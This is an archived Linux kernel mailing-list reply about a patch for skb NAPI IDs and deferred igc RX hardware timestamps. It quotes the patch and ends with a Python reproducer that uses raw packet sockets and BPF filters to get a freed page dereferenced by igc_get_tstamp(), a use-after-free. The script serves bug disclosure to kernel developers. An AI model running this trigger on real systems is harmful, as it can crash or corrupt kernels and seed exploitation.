Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=185.70.43.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1793930607;
	b=oSgwMgZCQmv4VIcg+b4TowEQGscKgEcilo1Rs/c+WVXINAKtj830m6EVbwTyEKEsPkxw
	 1RAm0QUPgd2Ll2WhGbcrXLwflwqKAAa69+URyI5LQMQ+1E9W2DkpZr7fFKnGOneVFtj+v
	 SUAXwbGwxul65nbWkL24ZaRSewrn5sKbRBz9d+7PrH8dzmVCPWGXOCAinydW1NP51PAtN
	 KETzjtVZ2v0b1rhzoFshRcHRR13VjtGivy8VtYsAu7KzBLNmzHCdm2ini50kLZCzGqp80
	 Q+CWZOddkC64G6wd0su61f+1kUrgvYtBw7HY7lgbhDLgM9oim+6971hMHKWEQb5dbhg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793930607;
	h=DMARC-Filter:DKIM-Signature:Date:To:From:Cc:Subject:Message-ID:
	 In-Reply-To:References:Feedback-ID:X-Pm-Message-ID:MIME-Version:
	 Content-Type:Content-Transfer-Encoding;
	bh=qKLhRmxatxipRQSiqFe6JQ0fnOvNmrMMEa/aZaqq4Ac=;
	b=aXELo8XJUj3dyN1hJxhNtIXlWi2TPuZyJ0D7On/tkXbN2XGVeHZPdf41syUiwVslKZr5
	 k7ZtzDmoFw+FRYxI19i8/Q+lMIJNyR6EY1qW5gbeDiAnbA2gI9uikxsrG3sz6iUeKHlzw
	 j1ACeLwFF64aHxt48gE+hvc8RX4uCIzwmpPGKuoe4zEmrouUdnI5SNCOXgZ+kyHetMzBI
	 NCxXp92AAjB8QGfWjP3cLWLPQ8N2bknXryZYo/0sOQMRetX0/EJ1MlNscuex9iiXq2fMC
	 a18SHneN4BaRT9VvGm8kdostcMpSbeZurgPHyIE4feAtti0aI2NRKvcHdhkTIFxb4cQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=1g4.org;
	spf=pass smtp.mailfrom=1g4.org;
	dkim=pass header.d=1g4.org header.i=@1g4.org header.a=rsa-sha256 header.s=protonmail header.b=qMNWAe99;
	arc=none smtp.remote-ip=185.70.43.18
Received: from mail-4318.protonmail.ch (mail-4318.protonmail.ch [185.70.43.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C9165606A326;
	Fri,  6 Nov 2026 02:03:25 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org C9165606A326
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=1g4.org
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=1g4.org
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=1g4.org header.i=@1g4.org header.a=rsa-sha256 header.s=protonmail header.b=qMNWAe99
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=1g4.org;
	s=protonmail; t=1793930603; x=1794189803;
	bh=qKLhRmxatxipRQSiqFe6JQ0fnOvNmrMMEa/aZaqq4Ac=;
	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
	 Feedback-ID:From:To:Cc:Date:Subject:Reply-To:Feedback-ID:
	 Message-ID:BIMI-Selector;
	b=qMNWAe99H+ttQ3Gtye9oyPgIlPn9Mq9Sj3cD4yQu7v/YChZ5519XtgEsqEwHG+C7H
	 XqFQTyeZBF/KGEJVMEghygzc2jOcdbbdduApwfXUi7i+rskQvPg4Z1hnfKYYE/10jo
	 +eoYiKmi3+fpHAr3qBtIMLDIRE+vTDbKdXxmunQWQsk9OILiuu0d3WWhg+ps729gMy
	 JVrktXrxP5KpUBm0FIpEMZ8I4dZbD2cGudLQ/+kEZl8PaxdpvHIozxeWiYUMLTOZ90
	 oonaAavfcQquVx8lqOlSDe83eMXPli7WGSsiCH7ukjYCsfeif5XRVg5fZQoRDeJPsv
	 CvOFYGIY/p6Yg==
Date: Fri, 06 Nov 2026 02:03:18 +0000
To: Ding Meng <meng.ding@siemens.com>
From: Paul Moses <p@1g4.org>
Cc: Randy Dunlap <rdunlap@infradead.org>, Mathieu Desnoyers <mathieu.desnoyers@efficios.com>, Martin KaFai Lau <martin.lau@linux.dev>, Song Liu <song@kernel.org>, Yonghong Song <yonghong.song@linux.dev>, Jiri Olsa <jolsa@kernel.org>, Emil Tsalapatis <emil@etsalapatis.com>, Ihor Solodrai <ihor.solodrai@linux.dev>, John Fastabend <john.fastabend@gmail.com>, Stanislav Fomichev <sdf@fomichev.me>, linux-doc@vger.kernel.org, linux-kernel@vger.kernel.org, intel-wired-lan@lists.osuosl.org, linux-trace-kernel@vger.kernel.org, bpf@vger.kernel.org
Subject: Re: [PATCH] net: mark skb NAPI IDs independently of busy polling
Message-ID: <b3kMbijg2Ui2lAO933CPjxagnUhCbBgN-9Qarvg_rC5TJaY9MfQM9qTwawp10wGmnZG1qYMkLMQwlkDfc_Ba6g9kCCImPWG3njfaKCq9yo8=@1g4.org>
In-Reply-To: <Tif4BSB0H3l8O1bLzRnhCE9hUYhsz6G3MIhQAgYZImUx1_8YwnCyzy89IV6OSTsXdHDT6fFf7rEL1qfRFJC9OPDHRlhl3cgNJyyE_mVlHWM=@1g4.org>
References: <20261105071706.7043-1-meng.ding@siemens.com> <Tif4BSB0H3l8O1bLzRnhCE9hUYhsz6G3MIhQAgYZImUx1_8YwnCyzy89IV6OSTsXdHDT6fFf7rEL1qfRFJC9OPDHRlhl3cgNJyyE_mVlHWM=@1g4.org>
Feedback-ID: 8253658:user:proton
X-Pm-Message-ID: 90692d34b4b1265dbd3773fb0e95547c0fea0eb2
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Post: <mailto:bpf@vger.kernel.org>
List-Help: <mailto:bpf+help@vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
List-Owner: <mailto:bpf+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable





On Thursday, November 5th, 2026 at 4:29 PM, Paul Moses <p@1g4.org> wrote:

>
>
>
>
> On Thursday, November 5th, 2026 at 1:19 AM, Ding Meng <meng.ding@siemens.=
com> wrote:
>
> > Commit 97dc7cd92ac6 ("ptp: Support late timestamp determination")
> > added support for deferring RX timestamp conversion to
> > ndo_get_tstamp(). When the timestamp is consumed, get_timestamp()
> > uses the skb's NAPI ID to find the device that owns the timestamp
> > cookie and invoke its callback.
> >
> > Commit e68b6e50fa35 ("udp: enable busy polling for all sockets")
> > gated NAPI ID bookkeeping with CONFIG_NET_RX_BUSY_POLL. As a result,
> > when busy polling is disabled, the skb may not carry a usable NAPI ID.
> > The device lookup then fails, so the driver callback is not invoked.
> > get_timestamp() falls back to hwtstamp, which does not contain the
> > converted timestamp, resulting in an incorrect RX hardware timestamp.
> >
> > Record skb NAPI IDs independently of busy-poll support to support
> > drivers that use deferred timestamp conversion and future driver
> > features that need to look up a device by its NAPI ID.
> >
> > Signed-off-by: Ding Meng <meng.ding@siemens.com>
> > Reviewed-by: Florian Bezdeka <florian.bezdeka@siemens.com>
> > ---
> > In the discussion of the issue reported at
> > https://lore.kernel.org/netdev/20260630112056.885071-1-meng.ding@siemen=
s.com/
> > this previous patch added an igc-specific fallback for configurations
> > with CONFIG_NET_RX_BUSY_POLL disabled. It populated skb's hwtstamp
> > field with a timestamp converted using the default hardware timer,
> > allowing get_timestamp() to return it without invoking ndo_get_tstamp()=
.
> > But Jakub Kicinski noted that the proposed fix appeared to be a
> > driver-specific workaround for a generic problem. The engleder driver
> > would also be affected by the same issue.
> >
> > This patch introduces a new configuration option to enable NAPI ID
> > bookkeeping independently of busy polling. The option is enabled
> > whenever busy polling is enabled, preserving the existing behavior.
> > It is also selected by the igc and engleder drivers, ensuring that
> > skbs carry a NAPI ID even when busy polling is disabled.
> >
> > Another approach considered was to require drivers using deferred
> > timestamp conversion, such as igc and engleder, to enable busy polling.
> > However, this would introduce an unnecessary dependency between two
> > independent features: hardware timestamp reporting should not require
> > busy polling to be enabled.
> >
> > Timestamping has been tested only with igc; it has not been tested
> > with engleder.
> >
> >  Documentation/networking/timestamping.rst | 11 ++++++++---
> >  drivers/net/ethernet/engleder/Kconfig     |  1 +
> >  drivers/net/ethernet/intel/Kconfig        |  1 +
> >  include/linux/skbuff.h                    |  4 ++--
> >  include/net/busy_poll.h                   |  2 +-
> >  include/trace/events/net.h                |  2 +-
> >  net/Kconfig                               |  4 ++++
> >  net/core/filter.c                         |  2 +-
> >  net/core/skbuff.c                         |  2 +-
> >  9 files changed, 20 insertions(+), 9 deletions(-)
> >
> > diff --git a/Documentation/networking/timestamping.rst b/Documentation/=
networking/timestamping.rst
> > index 2162c4f2b28a6..dbe40a1972639 100644
> > --- a/Documentation/networking/timestamping.rst
> > +++ b/Documentation/networking/timestamping.rst
> > @@ -278,9 +278,14 @@ SOF_TIMESTAMPING_OPT_PKTINFO:
> >    packets with hardware timestamps. The message contains struct
> >    scm_ts_pktinfo, which supplies the index of the real interface which
> >    received the packet and its length at layer 2. A valid (non-zero)
> > -  interface index will be returned only if CONFIG_NET_RX_BUSY_POLL is
> > -  enabled and the driver is using NAPI. The struct contains also two
> > -  other fields, but they are reserved and undefined.
> > +  interface index will be returned only if CONFIG_SKB_MARK_NAPI_ID is
> > +  enabled and the driver is using NAPI. This hidden configuration is
> > +  selected automatically by busy-poll support and by drivers that need
> > +  skb NAPI IDs to resolve deferred hardware timestamps. Drivers that
> > +  use deferred timestamp conversion must select it so the networking
> > +  stack can find the device and call its timestamp callback even when
> > +  busy polling is disabled. The struct contains also two other fields,
> > +  but they are reserved and undefined.
> >
> >  SOF_TIMESTAMPING_OPT_TX_SWHW:
> >    Request both hardware and software timestamps for outgoing packets
> > diff --git a/drivers/net/ethernet/engleder/Kconfig b/drivers/net/ethern=
et/engleder/Kconfig
> > index 3df6bf476ae7e..9700a243bea11 100644
> > --- a/drivers/net/ethernet/engleder/Kconfig
> > +++ b/drivers/net/ethernet/engleder/Kconfig
> > @@ -22,6 +22,7 @@ config TSNEP
> >  =09depends on PTP_1588_CLOCK_OPTIONAL
> >  =09select PHYLIB
> >  =09select PAGE_POOL
> > +=09select SKB_MARK_NAPI_ID
> >  =09help
> >  =09  Support for the Engleder TSN endpoint Ethernet MAC IP Core.
> >
> > diff --git a/drivers/net/ethernet/intel/Kconfig b/drivers/net/ethernet/=
intel/Kconfig
> > index 780f113986ea8..7fb63f351fc20 100644
> > --- a/drivers/net/ethernet/intel/Kconfig
> > +++ b/drivers/net/ethernet/intel/Kconfig
> > @@ -376,6 +376,7 @@ config IGC
> >  =09depends on PCI
> >  =09depends on PTP_1588_CLOCK_OPTIONAL
> >  =09depends on ETHTOOL_NETLINK
> > +=09select SKB_MARK_NAPI_ID
> >  =09help
> >  =09  This driver supports Intel(R) Ethernet Controller I225-LM/I225-V
> >  =09  family of adapters.
> > diff --git a/include/linux/skbuff.h b/include/linux/skbuff.h
> > index 6787fcf6ac3e4..164c862f7a403 100644
> > --- a/include/linux/skbuff.h
> > +++ b/include/linux/skbuff.h
> > @@ -1059,7 +1059,7 @@ struct sk_buff {
> >  =09=09=09__u16=09vlan_tci;
> >  =09=09};
> >  =09};
> > -#if defined(CONFIG_NET_RX_BUSY_POLL) || defined(CONFIG_XPS)
> > +#if defined(CONFIG_SKB_MARK_NAPI_ID) || defined(CONFIG_XPS)
> >  =09union {
> >  =09=09unsigned int=09napi_id;
> >  =09=09unsigned int=09sender_cpu;
> > @@ -1267,7 +1267,7 @@ static inline bool skb_pkt_type_ok(u32 ptype)
> >   */
> >  static inline unsigned int skb_napi_id(const struct sk_buff *skb)
> >  {
> > -#ifdef CONFIG_NET_RX_BUSY_POLL
> > +#ifdef CONFIG_SKB_MARK_NAPI_ID
> >  =09return skb->napi_id;
> >  #else
> >  =09return 0;
> > diff --git a/include/net/busy_poll.h b/include/net/busy_poll.h
> > index 6e172d0f6ef5f..f7c0e62c6a7d7 100644
> > --- a/include/net/busy_poll.h
> > +++ b/include/net/busy_poll.h
> > @@ -130,7 +130,7 @@ static inline void sk_busy_loop(struct sock *sk, in=
t nonblock)
> >  static inline void __skb_mark_napi_id(struct sk_buff *skb,
> >  =09=09=09=09      const struct gro_node *gro)
> >  {
> > -#ifdef CONFIG_NET_RX_BUSY_POLL
> > +#ifdef CONFIG_SKB_MARK_NAPI_ID
> >  =09/* If the skb was already marked with a valid NAPI ID, avoid overwr=
iting
> >  =09 * it.
> >  =09 */
> > diff --git a/include/trace/events/net.h b/include/trace/events/net.h
> > index dbc2c5598e35a..99ed7645242eb 100644
> > --- a/include/trace/events/net.h
> > +++ b/include/trace/events/net.h
> > @@ -208,7 +208,7 @@ DECLARE_EVENT_CLASS(net_dev_rx_verbose_template,
> >
> >  =09TP_fast_assign(
> >  =09=09__assign_str(name);
> > -#ifdef CONFIG_NET_RX_BUSY_POLL
> > +#ifdef CONFIG_SKB_MARK_NAPI_ID
> >  =09=09__entry->napi_id =3D napi_id_valid(skb->napi_id) ?
> >  =09=09=09=09   skb->napi_id : 0;
> >  #else
> > diff --git a/net/Kconfig b/net/Kconfig
> > index 76ab44aa439a6..8fa7586dc08ca 100644
> > --- a/net/Kconfig
> > +++ b/net/Kconfig
> > @@ -346,9 +346,13 @@ config CGROUP_NET_CLASSID
> >  =09  Cgroup subsystem for use as general purpose socket classid marker=
 that is
> >  =09  being used in cls_cgroup and for netfilter matching.
> >
> > +config SKB_MARK_NAPI_ID
> > +=09bool
> > +
> >  config NET_RX_BUSY_POLL
> >  =09bool
> >  =09default y if !PREEMPT_RT || (PREEMPT_RT && !NETCONSOLE)
> > +=09select SKB_MARK_NAPI_ID
> >
> >  config BQL
> >  =09bool
> > diff --git a/net/core/filter.c b/net/core/filter.c
> > index b7ac145b68b1f..e2218c18622b8 100644
> > --- a/net/core/filter.c
> > +++ b/net/core/filter.c
> > @@ -10274,7 +10274,7 @@ static u32 bpf_convert_ctx_access(enum bpf_acce=
ss_type type,
> >  =09=09break;
> >
> >  =09case offsetof(struct __sk_buff, napi_id):
> > -#if defined(CONFIG_NET_RX_BUSY_POLL)
> > +#if defined(CONFIG_SKB_MARK_NAPI_ID)
> >  =09=09*insn++ =3D BPF_LDX_MEM(BPF_W, si->dst_reg, si->src_reg,
> >  =09=09=09=09      bpf_target_off(struct sk_buff, napi_id, 4,
> >  =09=09=09=09=09=09     target_size));
> > diff --git a/net/core/skbuff.c b/net/core/skbuff.c
> > index eb9fcc4b1fd1a..386a32cdc0cc8 100644
> > --- a/net/core/skbuff.c
> > +++ b/net/core/skbuff.c
> > @@ -1581,7 +1581,7 @@ static void __copy_skb_header(struct sk_buff *new=
, const struct sk_buff *old)
> >  #ifdef CONFIG_NETWORK_SECMARK
> >  =09CHECK_SKB_FIELD(secmark);
> >  #endif
> > -#ifdef CONFIG_NET_RX_BUSY_POLL
> > +#ifdef CONFIG_SKB_MARK_NAPI_ID
> >  =09CHECK_SKB_FIELD(napi_id);
> >  #endif
> >  #ifdef CONFIG_XPS
> >
> > base-commit: d135ab453a7400a34930bdda1ef4bdc8acfac80e
> > --
> > 2.47.3
> >
> >
>
> Are you sure this does not make the preexisting timestamp lifetime
> issue more pathological? I think it needs to be fixed now as well.
> It was the last item mentioned by Sashiko in your review if I
> remember correctly.
>
> Paul

#!/usr/bin/env python3
# igc deferred RX timestamp: freed-page deref attempt on 4 KiB pages.
# - queue small timestamped reply P0 (copied path, netdev_data ptr into pag=
e PG)
# - stream large replies (frag path) so PG's two halves are handed to two
#   frag skbs; the second one makes igc_can_reuse_rx_page() fail and
#   __page_frag_cache_drain() drop the driver's references
# - consume the large skbs: last page ref drops -> page freed
# - recv P0 -> igc_get_tstamp() reads PG
import ctypes, socket, struct, sys, time
from pathlib import Path

IFACE =3D sys.argv[1] if len(sys.argv) > 1 else "enp2s0"
N =3D int(sys.argv[2]) if len(sys.argv) > 2 else 560
PEER_MAC =3D "c0:74:2b:fe:5d:aa"
SRC_IP, DST_IP =3D "198.18.0.2", "198.18.0.1"
SMALL =3D 0
LARGE =3D 1400
SO_ATTACH_FILTER =3D 26


class SockFilter(ctypes.Structure):
    _fields_ =3D [("code", ctypes.c_ushort), ("jt", ctypes.c_ubyte),
                ("jf", ctypes.c_ubyte), ("k", ctypes.c_uint)]


class SockFprog(ctypes.Structure):
    _fields_ =3D [("len", ctypes.c_ushort),
                ("filter", ctypes.POINTER(SockFilter))]


def bpf_prog(insns):
    arr =3D (SockFilter * len(insns))(*insns)
    return SockFprog(len(insns), ctypes.cast(arr, ctypes.POINTER(SockFilter=
))), arr


def attach_len_filter(sock, keep_large):
    BPF_LD_W_LEN, BPF_JMP_JGT_K, BPF_RET_K =3D 0x80, 0x25, 0x06
    if keep_large:
        insns =3D [SockFilter(BPF_LD_W_LEN, 0, 0, 0),
                 SockFilter(BPF_JMP_JGT_K, 1, 0, 200),
                 SockFilter(BPF_RET_K, 0, 0, 0),
                 SockFilter(BPF_RET_K, 0, 0, 0x40000)]
    else:
        insns =3D [SockFilter(BPF_LD_W_LEN, 0, 0, 0),
                 SockFilter(BPF_JMP_JGT_K, 0, 1, 200),
                 SockFilter(BPF_RET_K, 0, 0, 0),
                 SockFilter(BPF_RET_K, 0, 0, 0x40000)]
    prog, arr =3D bpf_prog(insns)
    sock.setsockopt(socket.SOL_SOCKET, SO_ATTACH_FILTER,
                    ctypes.string_at(ctypes.byref(prog), ctypes.sizeof(prog=
)))
    return arr


def csum(data):
    if len(data) & 1:
        data +=3D b"\0"
    total =3D sum(struct.unpack("!" + "H" * (len(data) // 2), data))
    while total >> 16:
        total =3D (total & 65535) + (total >> 16)
    return (~total) & 65535


def frame(seq, size):
    src =3D bytes.fromhex(Path("/sys/class/net/" + IFACE + "/address")
                        .read_text().strip().replace(":", ""))
    dst =3D bytes.fromhex(PEER_MAC.replace(":", ""))
    payload =3D bytes(((i * 131 + seq * 17) & 255) for i in range(size))
    icmp =3D struct.pack("!BBHHH", 8, 0, 0, 0x49C6, seq) + payload
    icmp =3D icmp[:2] + struct.pack("!H", csum(icmp)) + icmp[4:]
    ip =3D struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(icmp), seq, 0x400=
0,
                     64, 1, 0, socket.inet_aton(SRC_IP), socket.inet_aton(D=
ST_IP))
    ip =3D ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return dst + src + b"\x08\x00" + ip + icmp


def mksock(keep_large):
    s =3D socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.bind((IFACE, 0))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 64 << 20)
    s.setsockopt(263, 23, 1)
    s.setsockopt(socket.SOL_SOCKET, 37, 16 | 64)
    attach_len_filter(s, keep_large)
    s.setblocking(False)
    return s


seen =3D ctypes.create_string_buffer
small =3D mksock(False)
large =3D mksock(True)

# reset stats
small.getsockopt(263, 6, 8)
large.getsockopt(263, 6, 8)

small.send(frame(900, SMALL))
time.sleep(0.3)
print("P0 queued on small socket", flush=3DTrue)

t0 =3D time.time()
for i in range(N):
    large.send(frame(2000 + i, LARGE))
    time.sleep(0.001)
time.sleep(1.0)

pkt, drop =3D struct.unpack("=3D2I", large.getsockopt(263, 6, 8))
print("large burst sent %d, received %d, drops %d, %.3fs"
      % (N, pkt, drop, time.time() - t0), flush=3DTrue)

# consume the large skbs; frees any page the driver had drained
got =3D 0
while True:
    try:
        large.recvmsg(4096, 256)
        got +=3D 1
        if got % 128 =3D=3D 0:
            time.sleep(0)
    except BlockingIOError:
        break
print("drained %d large skbs" % got, flush=3DTrue)

# now read P0: igc_get_tstamp() dereferences its stale netdev_data
try:
    data, anc, flags, addr =3D small.recvmsg(2048, 512)
    print("read P0: %d bytes" % len(data), flush=3DTrue)
except BlockingIOError:
    print("P0 not queued!", flush=3DTrue)

